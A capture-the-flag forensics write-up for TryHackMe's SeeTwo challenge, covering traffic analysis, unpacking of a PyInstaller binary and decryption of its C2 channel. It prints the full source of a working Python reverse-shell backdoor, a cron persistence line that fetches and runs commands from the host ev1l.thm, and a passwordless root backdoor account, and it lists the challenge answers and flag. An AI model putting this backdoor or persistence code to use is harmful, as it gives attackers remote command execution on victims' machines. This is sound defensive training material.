---
author: NmToan
date: 2025-12-29T04:59:04.866Z
lastmod: 2026-04-27T00:00:00.000Z
title: SeeTwo TryHackMe
slug: SeeTwo-TryHackMe
featured: false
draft: false
tags:
  - Forensics
  - TryHackMe
description: Write-up for the SeeTwo challenge on TryHackMe, covering traffic analysis and reversing a Python backdoor to decrypt C2 communications.
---

> **Topic:** Traffic analysis and reversing a Python backdoor to decrypt the C2 channel  
> **Goal:** Analyze `capture.pcap`, identify suspicious activity, reverse the malware, and decrypt the communication between the victim and the C2 server

## Challenge Description

The challenge provides suspicious network traffic collected by a digital forensics team. The affected server has already been removed from production, and the goal is to determine what happened.

## Analysis Plan

I started by following the TCP streams in the pcap to inspect the exchanged data. Two things stood out quickly:

1. a large file was downloaded over HTTP,
2. several other streams contained long base64-looking blobs.

## 1. Identify the Downloaded File

One of the early streams showed:

```text
GET /base64_client HTTP/1.1
User-Agent: Wget/1.20.3 (linux-gnu)
Host: 10.0.2.64
```

The HTTP response contained a very large payload that looked like base64. Other streams also contained data beginning with:

```text
iVBORw0KGgo...
```

which is a common PNG base64 prefix. That suggests the attacker was disguising data as images or generic binary content.

I then exported the HTTP objects from Wireshark:

```text
File -> Export Objects -> HTTP
```

This produced:

- `base64_client`

## 2. Decode `base64_client`

When viewed directly, `base64_client` was just a huge base64 text blob. I decoded it with:

```bash
base64 -d base64_client > decoded_file
```

Then checked the result:

```bash
file decoded_file
```

The output identified it as an ELF 64-bit executable.

At this point it was clear that:

- the victim downloaded an executable,
- the executable had been wrapped in base64 and transferred over HTTP.

## 3. Recognize It as Python Malware

Running `strings decoded_file | less` revealed enough clues to suggest that it was built from Python and packaged with PyInstaller.

So I extracted it using `pyinstxtractor`:

```bash
git clone https://github.com/extremecoders-re/pyinstxtractor
cd pyinstxtractor
python3 pyinstxtractor.py ../decoded_file
```

This created:

- `decoded_file_extracted`

Among the extracted files, the most suspicious one was:

- `client.pyc`

Its name closely matches the original downloaded file name, so it was the obvious next target.

## 4. Decompile `client.pyc`

To recover the Python source, I used `uncompyle6`:

```bash
python3 -m venv myenv
source myenv/bin/activate
pip install uncompyle6
uncompyle6 -o . client.pyc
```

That gave me `client.py`, whose core logic is:

```python
import socket, base64, subprocess, sys
HOST = "10.0.2.64"
PORT = 1337

def xor_crypt(data, key):
    key_length = len(key)
    encrypted_data = []
    for i, byte in enumerate(data):
        encrypted_byte = byte ^ key[i % key_length]
        encrypted_data.append(encrypted_byte)
    else:
        return bytes(encrypted_data)


with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.connect((HOST, PORT))
    while True:
        received_data = s.recv(4096).decode("utf-8")
        encoded_image, encoded_command = received_data.split("AAAAAAAAAA")
        key = "MySup3rXoRKeYForCommandandControl".encode("utf-8")
        decrypted_command = xor_crypt(base64.b64decode(encoded_command.encode("utf-8")), key)
        decrypted_command = decrypted_command.decode("utf-8")
        result = subprocess.check_output(decrypted_command, shell=True).decode("utf-8")
        encrypted_result = xor_crypt(result.encode("utf-8"), key)
        encrypted_result_base64 = base64.b64encode(encrypted_result).decode("utf-8")
        separator = "AAAAAAAAAA"
        send = encoded_image + separator + encrypted_result_base64
        s.sendall(send.encode("utf-8"))
```

## 5. Understand the Backdoor

The malware behavior can be summarized as follows.

### Connection Details

- C2 server: `10.0.2.64`
- Port: `1337`
- XOR key: `MySup3rXoRKeYForCommandandControl`

### Traffic Obfuscation

Each message is split into two parts using the separator:

```text
AAAAAAAAAA
```

- The first part is fake image-like data.
- The second part is the real encrypted payload.

### Encryption Scheme

The malware uses:

1. `Base64` to turn binary data into text,
2. `XOR` with a repeating key for encryption and decryption.

### Inbound Flow

1. receive data from the socket,
2. split on `AAAAAAAAAA`,
3. base64-decode the second part,
4. XOR-decrypt it,
5. execute the resulting command with `subprocess.check_output(..., shell=True)`.

### Outbound Flow

1. take the command output,
2. XOR-encrypt it,
3. base64-encode it,
4. append it after the fake image data,
5. send it back to the C2 server.

So this is a simple but functional Python backdoor.

## 6. Decrypt the Full C2 Traffic

Once the format was understood, I wrote a script to decode the command and result payloads from the traffic dump:

```python
import base64

INPUT_PATH = r"D:\CTF\THM\evidence-1698376680956\dump.txt"
OUTPUT_PATH = INPUT_PATH.replace("dump.txt", "communicate.txt")

KEY = b"MySup3rXoRKeYForCommandandControl"
SEPARATOR = "AAAAAAAAAA"

def main():
    success_count = 0
    try:
        with open(INPUT_PATH, "r", encoding="utf-8", errors="ignore") as infile, \
             open(OUTPUT_PATH, "w", encoding="utf-8") as outfile:
            for line in infile:
                line = line.strip()
                if not line:
                    continue
                try:
                    if SEPARATOR in line:
                        encoded_data = line.split(SEPARATOR)[1]
                    else:
                        continue

                    decoded_data = base64.b64decode(encoded_data)
                    decrypted = bytes(b ^ KEY[i % len(KEY)] for i, b in enumerate(decoded_data))
                    decrypted_text = decrypted.decode("utf-8", errors="ignore")
                    outfile.write(decrypted_text + "\n")
                    success_count += 1
                except (IndexError, base64.binascii.Error, ValueError):
                    continue
    except Exception as e:
        print(f"[-] Error: {e}")

if __name__ == "__main__":
    main()
```

This generated:

- `communicate.txt`

The file contained the decrypted commands and outputs, which provided enough evidence to answer the challenge questions.

## Answers

1. **What is the first file that is read? Enter the full path of the file.**
   - `/home/bella/.bash_history`

2. **What is the output of the file from question 1?**
   - `mysql -u root -p'vb0xIkSGbcEKBEi'`

3. **What is the user that the attacker created as a backdoor? Enter the entire line that indicates the user.**
   - `toor::0:0:root:/root:/bin/bash`

4. **What is the name of the backdoor executable?**
   - `/usr/bin/passswd`

5. **What is the md5 hash value of the executable from question 4?**
   - `23c415748ff840b296d0b93f98649dec`

6. **What was the first cronjob that was placed by the attacker?**
   - `* * * * * /bin/sh -c "sh -c $(dig ev1l.thm TXT +short @ns.ev1l.thm)"`

7. **What is the flag?**
   - `THM{See2sNev3rGetOld}`
